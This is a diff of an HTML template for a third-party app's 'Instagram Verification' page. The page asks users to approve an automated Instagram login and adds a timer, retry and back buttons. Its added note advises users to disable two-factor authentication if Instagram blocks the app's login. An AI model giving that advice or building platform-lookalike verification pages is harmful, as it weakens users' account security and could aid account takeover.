@@ -2,31 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Approve Login</title>
+    <title>Instagram Verification</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
 <body>
     <div class="container">
-        <h1>Instagram Login</h1>
-        <p>Instagram requires approval for this login attempt.</p>
-        <p>✅ An approval request has been initiated.</p>
+        <h1>Instagram Verification</h1>
+        <p>Instagram requires verification for security purposes.</p>
         
+        <div class="status-bar">
+            <div>Account: <strong>{{ session.username }}</strong></div>
+            <div id="status">Status: <strong>Waiting for verification</strong></div>
+        </div>
+        
+        <div class="tips" style="margin-bottom: 20px;">
+            <h4>Verification Status:</h4>
+            <p id="verification-status">⏳ Attempting to send verification request to Instagram...</p>
+        </div>
+
         <div class="tips">
             <h4>Instructions:</h4>
             <ol>
-                <li>Check your Instagram app for a notification about a login attempt</li>
-                <li>If no notification appears, check your email associated with Instagram</li>
+                <li>Check your Instagram mobile app for a login approval notification</li>
+                <li>If no notification appears in your app, check your email associated with Instagram</li>
                 <li>Look for a message asking "Was this you?" with confirmation buttons</li>
                 <li>Click "It was me" or the equivalent confirmation option</li>
+                <li>If no notification appears within 30 seconds, try the "Retry" button below</li>
             </ol>
         </div>
 
-        <div style="margin: 20px 0;">
-            <button type="button" id="retry-btn">Retry sending verification request</button>
+        <div style="margin: 20px 0; display: flex; gap: 10px;">
+            <button type="button" id="retry-btn" class="btn-warning" style="background: #ffc107;">Retry Verification Request</button>
+            <button type="button" id="back-btn" style="background: #6c757d;">Back to Login</button>
         </div>
         
         <form method="POST">
-            <button type="submit">I've approved the login</button>
+            <button type="submit" id="continue-btn">I've Approved the Login</button>
         </form>
         
         {% if error %}
@@ -37,18 +48,40 @@
             <h4>Troubleshooting:</h4>
             <ul>
                 <li>Make sure you're logged into the correct Instagram account on your device</li>
-                <li>Check both your notifications and email for the verification message</li>
-                <li>If you don't see any notifications, try clicking the "Retry" button above</li>
-                <li>Sometimes Instagram sends a code instead - in that case, you'll need to log in again</li>
+                <li>Check both your app notifications and email for the verification message</li>
+                <li>If no notifications appear, try logging in directly on Instagram's app or website to ensure your account is working properly</li>
+                <li>Instagram's security system might occasionally block automated login attempts</li>
+                <li>If problems persist, try logging in again with a different device or network</li>
             </ul>
+        </div>
+        
+        <div class="tips" style="margin-top: 20px; background: #f8d7da; border-left-color: #dc3545;">
+            <h4>Important Note:</h4>
+            <p>Instagram has recently updated their security measures. If no verification notification appears after multiple attempts, Instagram may be blocking automated login attempts from this application.</p>
+            <p>In this case, you may need to temporarily disable 2FA on your Instagram account or use an app password if available.</p>
         </div>
     </div>
 
     <script>
         // Add retry functionality
         document.getElementById('retry-btn').addEventListener('click', function() {
-            window.location.reload();
+            document.getElementById('verification-status').innerHTML = "🔄 Retrying verification request...";
+            setTimeout(() => {
+                window.location.reload();
+            }, 500);
         });
+        
+        // Back to login
+        document.getElementById('back-btn').addEventListener('click', function() {
+            window.location.href = "{{ url_for('login') }}";
+        });
+        
+        // Add timer to show activity
+        let seconds = 0;
+        setInterval(() => {
+            seconds++;
+            document.getElementById('status').innerHTML = `Status: <strong>Waiting for verification (${seconds}s)</strong>`;
+        }, 1000);
     </script>
 </body>
 </html>
